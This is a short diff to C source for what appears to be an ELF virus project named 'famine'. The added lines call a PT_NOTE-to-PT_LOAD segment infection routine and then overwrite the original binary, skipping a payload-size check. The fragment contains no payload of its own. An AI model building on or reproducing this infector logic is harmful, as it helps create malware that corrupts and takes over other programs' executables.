@@ -47,6 +47,12 @@ void apply_infection(t_famine *famine)
             famine->text_p_size = famine->phdr[i].p_filesz;
             famine->text_p_vaddr = famine->phdr[i].p_vaddr;
 
+            // TODO remove line bellow
+            pt_note_to_pt_load_infection(famine);
+            overwrite_original_binary(famine);
+            break;
+            // END TODO
+
             // Check if there is enought space for our payload in the text section.
             if (famine->payload_size > PAGE_SIZE)
             {
